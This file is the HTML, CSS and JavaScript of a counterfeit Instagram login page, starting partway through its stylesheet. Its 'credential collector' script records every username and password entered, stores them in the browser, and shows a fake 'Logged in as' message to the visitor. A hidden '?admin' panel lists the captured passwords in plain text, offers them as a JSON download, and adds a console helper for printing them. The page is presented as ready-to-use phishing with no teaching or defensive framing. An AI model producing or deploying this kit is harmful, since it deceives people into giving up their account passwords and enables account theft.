  :root{ --ig-blue:#0095f6; --ig-border:#dbdbdb; --ig-gray:#8e8e8e; }
  *{ box-sizing:border-box; }
  body{
    margin:0; background:#fafafa; color:#262626;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    display:flex; flex-direction:column; align-items:center; justify-content:center;
    min-height:100vh; padding:24px 12px;
  }
  .card{
    width:350px; max-width:100%; background:#fff;
    border:1px solid var(--ig-border); padding:36px 40px 22px; text-align:center;
  }
  .logo{ display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:28px; }
  .logo svg{ width:42px; height:42px; display:block; }
  .wordmark{
    font-family:'GrandHotel','Billabong',cursive;
    font-size:38px; line-height:1; letter-spacing:.5px;
  }
  input{
    width:100%; background:#fafafa; border:1px solid var(--ig-border); border-radius:3px;
    padding:11px 9px; font-size:13px; margin-bottom:6px; color:#262626;
  }
  input:focus{ outline:none; border-color:#a8a8a8; background:#fff; }
  .login-btn{
    width:100%; margin-top:10px; border:0; border-radius:8px; background:var(--ig-blue);
    color:#fff; font-weight:600; font-size:14px; padding:9px; cursor:pointer;
  }
  .login-btn:disabled{ opacity:.65; cursor:default; }
  .divider{
    display:flex; align-items:center; gap:16px; margin:18px 0;
    color:var(--ig-gray); font-size:12px; font-weight:600;
  }
  .divider::before,.divider::after{ content:""; flex:1; height:1px; background:var(--ig-border); }
  .forgot{ font-size:12px; color:#00376b; text-decoration:none; }
  .status{ margin-top:14px; min-height:16px; font-size:13px; color:var(--ig-gray); }
  .foot{ margin-top:14px; font-size:12px; color:var(--ig-gray); }
  .foot a{ color:#00376b; text-decoration:none; }

  /* ---------- private admin view (?admin) ---------- */
  #adminPanel{ display:none; width:720px; max-width:100%; }
  #adminPanel .card{ width:100%; padding:26px 26px 20px; text-align:left; }
  #adminPanel h2{ margin:0 0 4px; font-size:20px; }
  .count{ font-size:13px; color:var(--ig-gray); margin-bottom:16px; }
  table{ width:100%; border-collapse:collapse; font-size:13px; }
  th,td{ text-align:left; padding:8px 6px; border-bottom:1px solid #efefef; vertical-align:top; }
  th{ font-size:11px; text-transform:uppercase; letter-spacing:.04em; color:var(--ig-gray); }
  td.pw{ font-family:ui-monospace,Menlo,Consolas,monospace; color:#c13584; word-break:break-all; }
  td.n{ color:var(--ig-gray); width:28px; }
  .empty{ color:var(--ig-gray); text-align:center; padding:18px; }
  .bar{ display:flex; gap:10px; flex-wrap:wrap; margin-top:16px; }
  .bar button, .bar a{
    font-size:13px; padding:7px 12px; border-radius:6px; border:1px solid var(--ig-border);
    background:#fff; color:#262626; cursor:pointer; text-decoration:none;
  }
  .bar .danger{ color:#ed4956; border-color:#f3c2c6; }
</style>
</head>
<body>

<!-- ============ what the visitor sees ============ -->
<div class="card" id="loginCard">
  <div class="logo">
    <svg viewBox="0 0 48 48" aria-label="Instagram">
      <defs>
        <linearGradient id="igGrad" x1="0" y1="1" x2="1" y2="0">
          <stop offset="0%" stop-color="#feda75"/>
          <stop offset="30%" stop-color="#fa7e1e"/>
          <stop offset="60%" stop-color="#d62976"/>
          <stop offset="100%" stop-color="#962fbf"/>
        </linearGradient>
      </defs>
      <rect x="3" y="3" width="42" height="42" rx="12" ry="12"
            fill="none" stroke="url(#igGrad)" stroke-width="3.4"/>
      <circle cx="24" cy="24" r="9.6" fill="none" stroke="url(#igGrad)" stroke-width="3.4"/>
      <circle cx="35.2" cy="12.8" r="2.6" fill="url(#igGrad)"/>
    </svg>
    <span class="wordmark">Instagram</span>
  </div>

  <input id="username" placeholder="Phone number, username, or email" autocomplete="username">
  <input id="password" type="password" placeholder="Password" autocomplete="current-password">
  <button class="login-btn" id="loginBtn" onclick="showResult()">Log in</button>

  <div class="divider">OR</div>
  <a class="forgot" href="#">Forgot password?</a>
  <div class="status" id="status"></div>
</div>

<div class="foot">Don't have an account? <a href="#">Sign up</a></div>

<!-- ============ private view, only for you: add ?admin to the URL ============ -->
<div id="adminPanel">
  <div class="card">
    <h2>Captured logins</h2>
    <div class="count" id="count"></div>
    <table>
      <thead>
        <tr><th class="n">#</th><th>Username</th><th>Password</th><th>Time</th></tr>
      </thead>
      <tbody id="rows"></tbody>
    </table>
    <div class="bar">
      <button onclick="downloadJson()">Download JSON</button>
      <button class="danger" onclick="clearAll()">Clear all</button>
      <a href="index.html">Open login page</a>
    </div>
  </div>
</div>

<script>
// ---------- credential collector ----------
const STORAGE_KEY = "capturedLogins";

function getCaptured() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || []; }
  catch (e) { return []; }
}

function collectCredentials(username, password) {
  const entry = {
    username: username,
    password: password,
    at: new Date().toISOString(),
    page: location.href
  };
  const all = getCaptured();
  all.push(entry);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(all));
  window.capturedLogins = all;
  console.log("Captured credentials:", entry, "| total:", all.length);
  return entry;
}
// -------------------------------------------

function showResult() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value;

  if (!username || !password) {
    document.getElementById("status").textContent = "Please enter your username and password.";
    return;
  }

  collectCredentials(username, password);

  const btn = document.getElementById("loginBtn");
  btn.disabled = true;
  btn.textContent = "Logging in…";
  document.getElementById("status").textContent = "";

  setTimeout(function () {
    document.getElementById("status").textContent = "Logged in as " + username;
    btn.textContent = "Log in";
    btn.disabled = false;
  }, 800);
}

// ---------- private admin view ----------
function esc(s) {
  return String(s).replace(/[&<>"']/g, function (c) {
    return { "&": "&", "<": "<", ">": ">", '"': """, "'": "'" }[c];
  });
}

function renderAdmin() {
  document.getElementById("loginCard").style.display = "none";
  document.querySelector(".foot").style.display = "none";
  document.getElementById("adminPanel").style.display = "block";

  const all = getCaptured();
  document.getElementById("count").textContent =
    all.length + (all.length === 1 ? " login captured" : " logins captured");

  document.getElementById("rows").innerHTML = all.length
    ? all.map(function (e, i) {
        return "<tr><td class='n'>" + (i + 1) + "</td><td>" + esc(e.username) +
               "</td><td class='pw'>" + esc(e.password) + "</td><td>" +
               esc(new Date(e.at).toLocaleString()) + "</td></tr>";
      }).join("")
    : "<tr><td colspan='4' class='empty'>No logins yet</td></tr>";
}

function downloadJson() {
  const blob = new Blob([JSON.stringify(getCaptured(), null, 2)], { type: "application/json" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "captured-logins.json";
  a.click();
  URL.revokeObjectURL(a.href);
}

function clearAll() {
  if (!confirm("Delete all captured logins?")) return;
  localStorage.removeItem(STORAGE_KEY);
  window.capturedLogins = [];
  renderAdmin();
}

// console helper: showLogins() prints a table
window.showLogins = function () { console.table(getCaptured()); };

if (/[?&]admin\b/.test(location.search)) renderAdmin();
</script>

</body>
</html>
